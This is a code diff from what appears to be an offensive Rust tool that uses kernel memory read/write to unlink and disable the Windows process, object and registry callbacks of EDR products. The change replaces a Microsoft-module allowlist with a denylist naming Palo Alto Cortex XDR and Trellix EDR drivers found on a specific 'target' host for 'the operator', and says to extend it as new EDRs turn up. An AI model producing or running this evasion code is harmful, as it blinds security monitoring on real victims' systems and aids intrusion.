@@ -24,16 +24,28 @@ use crate::astra::{is_kptr, Astra};
 use crate::kernel::{vread, vread_u32, vread_u64, vwrite};
 use crate::pe::{export_rva, load_image};
 
-/// Microsoft-shipped modules whose callbacks we leave in place so the OS stays
-/// coherent (integrity checks, network filter, filter manager, credential
-/// provider, etc.). Anything else — CrowdStrike, SentinelOne, ESET, Sophos,
-/// Defender's realtime AV filter, Sysmon, Elastic, CarbonBlack, Cortex — gets
-/// its entries nulled.
-const KEEP_MODULES: &[&str] = &[
-    "ntoskrnl.exe", "ntkrnlmp.exe", "ci.dll", "cng.sys", "ksecdd.sys",
-    "tcpip.sys",    "ndis.sys",     "fltmgr.sys", "dxgkrnl.sys",
-    "ntfs.sys",     "clfs.sys",     "netio.sys",  "peauth.sys",
-    "mssecflt.sys", "storport.sys",
+/// Explicit denylist of EDR kernel drivers. ONLY callbacks whose function
+/// pointer resolves inside one of these modules get neutralized. Everything
+/// else — Microsoft's own drivers (UCPD, mmcss, iorate, ahcache, WinSetupMon,
+/// wtd, etc.), third-party but benign drivers (GPU, audio, VPN), Defender
+/// components — stays wired up. This is the safe direction of the check:
+/// an overly aggressive allowlist breaks process creation and hides bugs;
+/// a targeted denylist only cuts what we came to cut.
+///
+/// Currently loaded EDR footprint on this host (per the operator):
+///   cyvrlpc.sys, tedrdrv.sys, cyvrmtgn.sys, cyvrfsfd.sys, cyverak.sys
+/// Palo Alto Cortex XDR = cyvr* / cyver* family. Trellix EDR = tedrdrv.sys.
+///
+/// Extend this list as new EDRs are discovered on the target. Match is
+/// case-insensitive, exact filename against `BaseDllName`.
+const EDR_MODULES: &[&str] = &[
+    // Palo Alto Cortex XDR
+    "cyvrlpc.sys",
+    "cyvrmtgn.sys",
+    "cyvrfsfd.sys",
+    "cyverak.sys",
+    // Trellix EDR
+    "tedrdrv.sys",
 ];
 
 const PSP_MAX: usize = 64;
@@ -99,9 +111,11 @@ fn owner_of<'a>(mods: &'a [KernelModule], va: u64) -> Option<&'a KernelModule> {
     mods.iter().find(|m| va >= m.base && va < m.base + m.size)
 }
 
-fn is_ms_core(name: &str) -> bool {
+/// True if the module name matches an EDR driver we want to neutralize.
+/// Case-insensitive filename match against the `EDR_MODULES` denylist.
+fn is_edr(name: &str) -> bool {
     let lo = name.to_ascii_lowercase();
-    KEEP_MODULES.iter().any(|k| lo == *k)
+    EDR_MODULES.iter().any(|k| lo == *k)
 }
 
 fn owner_name(mods: &[KernelModule], va: u64) -> String {
@@ -237,7 +251,7 @@ fn wipe_ps_array(
         let func = vread_u64(drv, cr3, block_va + 8).unwrap_or(0);
         if !is_kptr(func) { continue; }
         let owner = owner_name(mods, func);
-        if is_ms_core(&owner) {
+        if !is_edr(&owner) {
             println!("    [{label} #{i:02}] keep    {owner}");
             continue;
         }
@@ -468,8 +482,8 @@ fn wipe_ob_list(
         let post  = vread_u64(drv, cr3, cur + 0x30).unwrap_or(0);
         let fp = if is_kptr(pre) { pre } else if is_kptr(post) { post } else { 0 };
         let owner = if fp == 0 { "<empty>".to_string() } else { owner_name(mods, fp) };
-        let keep = fp == 0 || is_ms_core(&owner);
-        if !keep {
+        let kill = fp != 0 && is_edr(&owner);
+        if kill {
             println!("    [{label} @ 0x{:X}] unlink <- {}  pre=0x{:X} post=0x{:X}",
                 cur, owner, pre, post);
             // Also flip Enabled to 0 so ObGetObjectSecurity-adjacent paths
@@ -562,7 +576,7 @@ fn wipe_cm_list(
             }
         }
         let owner = if fp == 0 { "<unknown>".to_string() } else { owner_name(mods, fp) };
-        if fp != 0 && !is_ms_core(&owner) {
+        if fp != 0 && is_edr(&owner) {
             println!("    [Cm @ 0x{:X}] unlink <- {}  (fn+0x{:X}=0x{:X})",
                 cur, owner, fp_off, fp);
             if let Err(e) = unlink_list_entry(drv, cr3, cur) {
